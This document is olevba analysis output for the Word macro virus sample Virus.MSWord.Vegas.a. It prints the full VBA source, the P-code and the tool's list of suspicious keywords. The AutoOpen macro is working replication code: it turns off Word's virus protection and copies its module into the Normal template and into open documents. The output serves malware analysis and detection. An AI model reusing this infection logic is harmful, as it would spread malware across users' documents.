olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vegas.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vegas.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub test()
MsgBox ("Test")
End Sub
-------------------------------------------------------------------------------
VBA MACRO Vegas.bas 
in file: Virus.MSWord.Vegas.a - OLE stream: 'Macros/VBA/vegas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub test2()
MsgBox ("Test2")
End Sub

-------------------------------------------------------------------------------
VBA MACRO Vegas1.bas 
in file: Virus.MSWord.Vegas.a - OLE stream: 'Macros/VBA/Vegas1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Public Declare Function ExitWindows Lib "user32" (ByVal dwReserved As Long, ByVal uReturnCode As Long) As Long
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub ShowFreeSpace(drvpath)
    Dim fs, d, s
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set d = fs.GetDrive(fs.GetDriveName(drvpath))
    s = "Drive " & UCase(drvpath) & " - "
    s = s & d.VolumeName & vbCrLf
    s = s & "Free Space: " & FormatNumber(d.FreeSpace / 1024, 0)
    s = s & " Kbytes"
    MsgBox s
End Sub




Sub ShowFolderList()
Dim fs, f, f1, fc, s, i, folderspec
    folderspec = "D:\"
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFolder(folderspec)
    Set fc = f.subfolders
    For i = 1 To fc.Count
    s = s & fc.Item(1)
    s = s & vbCrLf
    Next i
    MsgBox s
End Sub

Sub ShowFileList()
    Dim fs, f, f1, fc, s, folderspec
    Set fs = CreateObject("Scripting.FileSystemObject")
    folderspec = "D:\"
    Set f = fs.GetFolder(folderspec)
    Set fc = f.Files
    For Each f1 In fc
        s = s & f1.Name
        s = s & vbCrLf
    Next
    MsgBox s
End Sub


Sub ShowDriveType()
Dim fs, d, dd, dc, n, s, t
Dim fe, drvpath
    drvpath = "d:\"
    Set fs = CreateObject("Scripting.FileSystemObject")
    'Set d = fs.GetDrive(drvpath)
    Set dc = fs.Drives
    For Each d In dc
        s = s & d.DriveLetter & " - "
        Select Case d.DriveType
        Case 0: t = "Unknown"
        Case 1: t = "Removable"
        Case 2: t = "Fixed"
        Case 3: t = "Network"
        Case 4: t = "CD-ROM"
        Case 5: t = "RAM Disk"
        End Select
        If d.DriveType = 1 Then
            n = d.ShareName
        Else
            n = d.VolumeName
        End If
        s = s & "Drive " & d.DriveLetter & ": - " & t & " - " & n & vbCrLf
    Next
    MsgBox s
End Sub

Sub qw()
Call ShowDriveType("d:\")
End Sub

Sub ShowFileSize()
    Dim fs, f, s, filespec
    Set fs = CreateObject("Scripting.FileSystemObject")
    filespec = "d:\pass.exe"
    Set f = fs.GetFile(filespec)
    s = UCase(f.Name) & " is a " & f.Type
    MsgBox s, 0, "File Size Info"
End Sub


Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRr000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "Vegas" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "Vegas" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
ActiveDocument.Save
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
End Sub

Sub AutoExec()
End Sub

Sub Fileprint()
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSave()
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vegas.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1443 bytes
' Line #0:
' 	FuncDefn (Sub test())
' Line #1:
' 	LitStr 0x0004 "Test"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #2:
' 	EndSub 
' Macros/VBA/vegas - 918 bytes
' Line #0:
' 	FuncDefn (Sub test2())
' Line #1:
' 	LitStr 0x0005 "Test2"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' Macros/VBA/Vegas1 - 8618 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn NStat
' Line #2:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn VStat
' Line #3:
' 	FuncDefn (Public Declare Sub FatalAppExit Lib "kernel32" (ByVal uAction As Long, ByVal lpMessageText As String))
' Line #4:
' 	FuncDefn (Public Declare Function ExitWindows Lib "user32" (ByVal dwReserved As Long, ByVal uReturnCode As Long) As Long)
' Line #5:
' 	FuncDefn (Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #6:
' Line #7:
' 	FuncDefn (Sub ShowFreeSpace(drvpath))
' Line #8:
' 	Dim 
' 	VarDefn fs
' 	VarDefn d
' 	VarDefn s
' Line #9:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #10:
' 	SetStmt 
' 	Ld drvpath 
' 	Ld fs 
' 	ArgsMemLd GetDriveName 0x0001 
' 	Ld fs 
' 	ArgsMemLd GetDrive 0x0001 
' 	Set d 
' Line #11:
' 	LitStr 0x0006 "Drive "
' 	Ld drvpath 
' 	ArgsLd UCase 0x0001 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	St s 
' Line #12:
' 	Ld s 
' 	Ld d 
' 	MemLd VolumeName 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	St s 
' Line #13:
' 	Ld s 
' 	LitStr 0x000C "Free Space: "
' 	Concat 
' 	Ld d 
' 	MemLd FreeSpace 
' 	LitDI2 0x0400 
' 	Div 
' 	LitDI2 0x0000 
' 	ArgsLd FormatNumber 0x0002 
' 	Concat 
' 	St s 
' Line #14:
' 	Ld s 
' 	LitStr 0x0007 " Kbytes"
' 	Concat 
' 	St s 
' Line #15:
' 	Ld s 
' 	ArgsCall MsgBox 0x0001 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' 	FuncDefn (Sub ShowFolderList())
' Line #22:
' 	Dim 
' 	VarDefn fs
' 	VarDefn False
' 	VarDefn f1
' 	VarDefn fc
' 	VarDefn s
' 	VarDefn i
' 	VarDefn folderspec
' Line #23:
' 	LitStr 0x0003 "D:\"
' 	St folderspec 
' Line #24:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #25:
' 	SetStmt 
' 	Ld folderspec 
' 	Ld fs 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set False 
' Line #26:
' 	SetStmt 
' 	Ld False 
' 	MemLd subfolders 
' 	Set fc 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fc 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld fc 
' 	ArgsMemLd Item 0x0001 
' 	Concat 
' 	St s 
' Line #29:
' 	Ld s 
' 	Ld vbCrLf 
' 	Concat 
' 	St s 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	Ld s 
' 	ArgsCall MsgBox 0x0001 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Sub ShowFileList())
' Line #35:
' 	Dim 
' 	VarDefn fs
' 	VarDefn False
' 	VarDefn f1
' 	VarDefn fc
' 	VarDefn s
' 	VarDefn folderspec
' Line #36:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #37:
' 	LitStr 0x0003 "D:\"
' 	St folderspec 
' Line #38:
' 	SetStmt 
' 	Ld folderspec 
' 	Ld fs 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set False 
' Line #39:
' 	SetStmt 
' 	Ld False 
' 	MemLd Files 
' 	Set fc 
' Line #40:
' 	StartForVariable 
' 	Ld f1 
' 	EndForVariable 
' 	Ld fc 
' 	ForEach 
' Line #41:
' 	Ld s 
' 	Ld f1 
' 	MemLd New 
' 	Concat 
' 	St s 
' Line #42:
' 	Ld s 
' 	Ld vbCrLf 
' 	Concat 
' 	St s 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	Ld s 
' 	ArgsCall MsgBox 0x0001 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' Line #48:
' 	FuncDefn (Sub ShowDriveType())
' Line #49:
' 	Dim 
' 	VarDefn fs
' 	VarDefn d
' 	VarDefn dd
' 	VarDefn dc
' 	VarDefn n
' 	VarDefn s
' 	VarDefn t
' Line #50:
' 	Dim 
' 	VarDefn fe
' 	VarDefn drvpath
' Line #51:
' 	LitStr 0x0003 "d:\"
' 	St drvpath 
' Line #52:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #53:
' 	QuoteRem 0x0004 0x001C "Set d = fs.GetDrive(drvpath)"
' Line #54:
' 	SetStmt 
' 	Ld fs 
' 	MemLd Drives 
' 	Set dc 
' Line #55:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld dc 
' 	ForEach 
' Line #56:
' 	Ld s 
' 	Ld d 
' 	MemLd DriveLetter 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	St s 
' Line #57:
' 	Ld d 
' 	MemLd DriveType 
' 	SelectCase 
' Line #58:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Unknown"
' 	St t 
' Line #59:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "Removable"
' 	St t 
' Line #60:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Fixed"
' 	St t 
' Line #61:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Network"
' 	St t 
' Line #62:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CD-ROM"
' 	St t 
' Line #63:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 "RAM Disk"
' 	St t 
' Line #64:
' 	EndSelect 
' Line #65:
' 	Ld d 
' 	MemLd DriveType 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	Ld d 
' 	MemLd ShareName 
' 	St n 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	Ld d 
' 	MemLd VolumeName 
' 	St n 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld s 
' 	LitStr 0x0006 "Drive "
' 	Concat 
' 	Ld d 
' 	MemLd DriveLetter 
' 	Concat 
' 	LitStr 0x0004 ": - "
' 	Concat 
' 	Ld t 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld n 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	St s 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' 	Ld s 
' 	ArgsCall MsgBox 0x0001 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Sub qw())
' Line #76:
' 	LitStr 0x0003 "d:\"
' 	ArgsCall (Call) ShowDriveType 0x0001 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Sub ShowFileSize())
' Line #80:
' 	Dim 
' 	VarDefn fs
' 	VarDefn False
' 	VarDefn s
' 	VarDefn filespec
' Line #81:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #82:
' 	LitStr 0x000B "d:\pass.exe"
' 	St filespec 
' Line #83:
' 	SetStmt 
' 	Ld filespec 
' 	Ld fs 
' 	ArgsMemLd GetFile 0x0001 
' 	Set False 
' Line #84:
' 	Ld False 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 " is a "
' 	Concat 
' 	Ld False 
' 	MemLd TypeOf 
' 	Concat 
' 	St s 
' Line #85:
' 	Ld s 
' 	LitDI2 0x0000 
' 	LitStr 0x000E "File Size Info"
' 	ArgsCall MsgBox 0x0003 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' 	FuncDefn (Sub AutoOpen())
' Line #90:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #91:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #92:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #93:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #94:
' 	Dim 
' 	VarDefn pth (As String)
' 	VarDefn i (As Byte)
' 	VarDefn dc (As Object)
' Line #95:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' Line #96:
' 	OnError (Resume Next) 
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #98:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRr000^.tmp"
' 	Concat 
' 	St pth 
' Line #99:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #101:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Vegas"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St NInst 
' Line #103:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #108:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Vegas"
' 	Eq 
' 	IfBlock 
' Line #109:
' 	LitDI2 0x0001 
' 	St AInst 
' Line #110:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set dc 
' 	EndIf 
' Line #114:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' 	EndIf 
' Line #115:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #116:
' 	Ld pth 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #117:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #118:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #119:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Sub AutoExec())
' Line #124:
' 	EndSub 
' Line #125:
' Line #126:
' 	FuncDefn (Sub Fileprint())
' Line #127:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub FileSave())
' Line #130:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub FileSaveAs())
' Line #133:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |pass.exe            |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

